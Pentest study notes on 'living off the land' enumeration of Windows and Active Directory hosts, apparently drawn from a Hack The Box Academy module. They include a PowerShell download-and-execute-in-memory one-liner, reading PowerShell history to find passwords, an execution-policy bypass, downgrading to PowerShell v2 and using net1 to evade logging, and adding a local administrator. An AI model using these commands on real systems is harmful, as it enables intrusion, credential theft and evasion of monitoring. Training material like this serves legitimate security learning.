Living Off the Land
####################

Date: 2024-12-25 12:34:44

Status: #new

Tags: :ref:`active directory enumeration attacks`

Description
*************

In scenarios where a more stealthy approach to pentesting is required, or you are unable to load and/or use any third
party tools, you may have to take avantage to utilities that are common to the operating system.  

This approach makes less noise on the network, and is less likely to be identified and blocked using these techniques.

Enumerating using ENV variables
*********************************

`hostname`                                  Displays the host name 
`[System.Environment]::OSVersion.Version`	Prints out the OS version and revision level
`wmic qfe get Caption,Description,
HotFixID,InstalledOn`                       Prints the patches and hotfixes applied to the host
`ipconfig /all`                             Prints out network adapter state and configurations
`echo %USERDOMAIN%`                         Displays the domain name to which the host belongs (run from CMD-prompt)
`echo %logonserver%`                        Prints out the name of the Domain controller the host checks in with (run from CMD-prompt)

Harnessing PowerShell
**********************

- Lists available modules loaded for use.

.. code-block:: powershell

    Get-Module

- Will print the execution policy settings for each scope on a host.

.. code-block:: powershell

    Get-ExecutionPolicy -List

- This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.

.. code-block:: powershell

    Set-ExecutionPolicy Bypass -Scope Process

- Return environment values such as key paths, users, computer information, etc.

.. code-block:: powershell

    Get-ChildItem Env: | ft Key,Value

- With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.

.. code-block:: powershell

    Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

- This is a quick and easy way to download a file from the web using PowerShell and call it from memory.

.. code-block:: powershell

    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"

 - Attempt to call Powershell version 2.0 or older.  Version 3.0 has logging, 2.0 does not - for stealthy operations

.. code-block:: powershell

    powershell.exe -version 2

- Checking to see the status of the Firewall

.. code-block:: powershell

    PS C:\htb> netsh advfirewall show allprofiles

.. code-block:: console

    C:\htb> sc query windefend

- Geting the configuration settings for Defender

.. code-block:: powershell

    PS C:\htb> Get-MpComputerStatus

- Checking to see who else may be logged in

.. code-block:: powershell

    PS C:\htb> qwinsta


Windows Management Instrumentation (WMI)
******************************************

A scripting engine for system management purposes.  utilizing this will alow you to enumerate details of the confiruration

See below for examples

- :ref:`wmi` 

Net Commands
**************

.. warning:: 
    
    Net commands create logs, and are often monitored by EDR solutions. In a stealthy engagement these commands can give away your location.
    There is a work around, where you can try net1 instead of net - it may not log.

Table of Useful Net Commands
=============================

.. list-table:: Net Commands
   :widths: 50 50
   :header-rows: 1

   * - Command 
     - Description
   * - `net accounts`
     - Information about password requirements
   * - `net accounts /domain`
     - Password and lockout policy
   * - `net group /domain`
     - Information about domain groups
   * - `net group "Domain Admins" /domain`
     - List users with domain admin privileges
   * - `net group "domain computers" /domain`
     - List of PCs connected to the domain
   * - `net group "Domain Controllers" /domain`
     - List PC accounts of domains controllers
   * - `net group <domain_group_name> /domain`
     - User that belongs to the group
   * - `net groups /domain`
     - List of domain groups
   * - `net localgroup`
     - All available groups
   * - `net localgroup administrators /domain`
     - List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
   * - `net localgroup Administrators`
     - Information about a group (admins)
   * - `net localgroup administrators [username] /add`
     - Add user to administrators
   * - `net share`
     - Check current shares
   * - `net user <ACCOUNT_NAME> /domain`
     - Get information about a user within the domain
   * - `net user /domain`
     - List all users of the domain
   * - `net user %username%`
     - Information about the current user
   * - `net use x: \computer\share`
     - Mount the share locally
   * - `net view`
     - Get a list of computers
   * - `net view /all /domain[:domainname]`
     - Shares on the domains
   * - `net view \computer /ALL`
     - List shares of a computer
   * - `net view /domain`
     - List of PCs of the domain


Dsquery
********

- :ref:`dsquery`

References
***********
https://academy.hackthebox.com/module/143/section/1360
